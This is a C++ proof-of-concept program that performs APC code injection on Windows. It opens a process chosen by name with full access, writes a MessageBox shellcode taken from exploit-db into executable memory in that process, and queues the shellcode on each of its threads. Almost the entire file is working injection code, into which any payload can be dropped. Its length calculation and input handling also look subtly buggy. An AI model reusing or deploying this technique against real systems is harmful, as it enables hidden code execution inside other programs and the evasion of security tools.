/**
 *	@file: apcCodeInject.cpp
 *	@author: aaaddress1@chroot.org
 *	@date:	2017/8/11
**/
#include <windows.h>
#include <TlHelp32.h>

/*
* Windows x86 - user32!MessageBox 'Hello World!' Null-Free Shellcode (199 bytes)
* @src: https://www.exploit-db.com/exploits/37758/
*/
char *shellcode =
"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
"\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";

DWORD get_process_id(wchar_t proc_name[])
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process))
	{
		do
		{
			if (!wcscmp(process.szExeFile, proc_name))
				break;
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return process.th32ProcessID;
}

void apc_invoke(DWORD pid, LPVOID mem_func)
{
	auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return;
	THREADENTRY32 te = { sizeof(te) };
	if (Thread32First(hSnapshot, &te)) {
		do {
			if (te.th32OwnerProcessID == pid) {

				HANDLE hThread = ::OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
				if (hThread)
				{
					::QueueUserAPC((PAPCFUNC)mem_func, hThread, NULL);
					printf("%p\n", hThread);
				}
			}
		} while (::Thread32Next(hSnapshot, &te));
	}

}

int main()
{
	wchar_t proc_name[32];

	puts("process name? ");
	wscanf(L"%32s", &proc_name);
	DWORD process_id = get_process_id(proc_name);
	HANDLE access_token;

	if (!process_id)
	{
		wprintf(L"%s not found or access process failure", proc_name);
		return -1;
	}

	access_token = OpenProcess(PROCESS_ALL_ACCESS, TRUE, process_id);
	LPVOID mem = VirtualAllocEx
	(
		access_token,
		NULL,
		strlen(shellcode + 1),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	WriteProcessMemory
	(
		access_token,
		mem,
		shellcode,
		strlen(shellcode + 1),
		NULL
	);
	apc_invoke(process_id, mem);

	puts("finish!");
	getchar();
	return 0;
}